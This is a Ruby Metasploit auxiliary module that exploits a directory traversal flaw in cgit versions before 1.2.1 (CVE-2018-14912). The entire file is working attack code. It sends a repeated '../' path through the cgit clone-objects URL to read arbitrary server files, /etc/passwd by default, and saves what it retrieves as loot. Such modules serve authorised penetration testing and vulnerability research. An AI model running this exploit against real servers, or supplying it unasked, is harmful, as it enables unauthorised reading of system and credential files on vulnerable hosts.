##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Directory traversal in cgit',
      'Description' => %q{
        This module exploits a directory traversal vulnerability which
        exits in cgit < 1.2.1 cgit_clone_objects(), reachable when the
        configuration flag enable-http-clone is set to 1 (default)
      },
      'References'  =>
        [
          ['CVE', '2018-14912'],
          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1627'],
          ['EDB', '45148']
        ],
      'Author'      =>
        [
          'Google Project Zero', # Vulnerability discovery
          'Dhiraj Mishra' # Metasploit module
        ],
      'DisclosureDate' => 'Aug 03 2018',
      'License'     => MSF_LICENSE
    ))

  register_options(
      [
        Opt::RPORT(80),
        OptString.new('FILEPATH', [true, "The path to the file to read", '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 6 ])
      ])
  end

   def run_host(ip)
    filename = datastore['FILEPATH']
    traversal = "../" * datastore['DEPTH'] << filename

    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "/cgit/cgit.cgi/git/objects/?path=#{traversal}"
    })

    unless res && res.code == 200
      print_error('Nothing was downloaded')
      return
   end

    vprint_good("#{peer} - #{res.body}")
    path = store_loot(
      'cgit.traversal',
      'text/plain',
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end
